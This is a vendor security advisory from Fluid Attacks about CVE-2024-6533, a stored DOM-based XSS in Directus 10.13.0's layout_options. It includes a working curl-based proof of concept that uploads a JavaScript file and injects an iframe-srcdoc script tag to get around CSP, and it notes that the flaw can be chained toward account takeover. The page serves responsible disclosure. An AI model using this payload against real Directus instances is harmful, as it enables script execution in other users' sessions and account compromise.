[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# Directus 10.13.0 - DOM-based XSS

## Summary

|  |  |
| --- | --- |
| **Name** | Directus 10.13.0 - DOM-Based cross-site scripting (XSS) via layout\_options |
| **Code name** | [Bocelli](https://en.wikipedia.org/wiki/Andrea_Bocelli) |
| **Product** | Directus |
| **Affected versions** | 10.13.0 |
|
| **State** | Public |
|

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | DOM-Based cross-site scripting (XSS) |
| **Rule** | [371. DOM-Based cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/371) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N/E:H/RL:U/RC:C |
| **CVSSv3.1 Base Score** | 4.1 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2024-6533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6533) |

## Description

Directus v10.13.0 allows an authenticated external attacker to execute
arbitrary JavaScript on the client. This is possible because the application
injects an attacker-controlled parameter that will be stored in the server and
used by the client into an unsanitized DOM element. When chained with
CVE-2024-6534, it could result in account takeover.

## Vulnerability

This vulnerability occurs because the application injects an
attacker-controlled parameter that will be stored in the server and used by
the client into an unsanitized DOM element.

### Exploit

To exploit this vulnerability, we need to do the following steps using a
non-administrative, default role attacker account.

1. Upload the following JavaScript file.

   Using the upload functionality at `POST /files`. This PoC will show an
   alert message.

   ```
   export TARGET_HOST="http://localhost:8055"
   export ATTACKER_EMAIL="malicious@malicious.com"
   export ATTACKER_PASSWORD="123456"
   root_dir=$(dirname $0)
   mkdir "${root_dir}/static"

   curl -s -k -o /dev/null -w "%{http_code}" -X 'POST' "${TARGET_HOST}/auth/login" \
       -c "${root_dir}/static/attacker_directus_session_token" \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASSWORD}\",\"mode\":\"session\"}"

   id_url_file=$(echo "alert('Successful DOM-based XSS')" |
     curl -s -k -X 'POST' "${TARGET_HOST}/files" \
       -b "${root_dir}/static/attacker_directus_session_token" \
       -F "file=@-;type=application/x-javascript;filename=poc.js" | jq -r ".data.id")

   ```
2. Create a preset for a collection and store the preset ID.

   Or use a preset already created from `GET /presets`. The following example
   uses the direct\_users preset.

   ```
   attacker_user_id=$(curl -s -k "${TARGET_HOST}/users/me" \
    -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data.id")

   curl -i -s -k -X 'POST' "${TARGET_HOST}/presets" \
    -H 'Content-Type: application/json' \
    -b "${root_dir}/static/attacker_directus_session_token" \
    --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${attacker_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"<iframe srcdoc=\\\"<script src='http://localhost:8055/assets/${id_url_file}'> </script>\\\">\",\"subtitle\":\"{{ email }}\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"

   ```

   When the user visits the view that uses the directus\_users preset,
   the JavaScript file will be executed.

   Notes:

   Need to use an `iframe` to execute the malicious JavaScript file to bypass
   the CSP policies. The payload structure is
   `<iframe srcdoc=\"<script src='URL_MALICIOUS_FILE'> </script>\">`.

   We can target any collection that uses the vulnerable template structure that
   renders the layout option section.

   In this PoC, the target is the same user who sends the payload, but if the
   attacking user has permission to modify or create presets for other users or
   even if he does not have permissions but can chain with CVE-2024-6534, he can
   achieve an account takeover.

## Evidence of exploitation

![vulnerability-code-directus](https://res.cloudinary.com/fluid-attacks/image/upload/v1720203046/airs/advisories/directusxss/vulnerability-code-directus.png)

![vulnerability-directus](https://res.cloudinary.com/fluid-attacks/image/upload/v1720203047/airs/advisories/directusxss/vulnerability-directus.png)

![exploit-success-directus](https://res.cloudinary.com/fluid-attacks/image/upload/v1720203046/airs/advisories/directusxss/exploit-success-directus.png)

## Our security policy

We have reserved the ID CVE-2024-6533 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: Directus 10.13.0
* Operating System: Any

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by
[Miguel GÃ³mez](https://www.linkedin.com/in/conmagor) from
Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://directus.io/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-07-04

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-07-15

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-07-16

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-08-14

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)

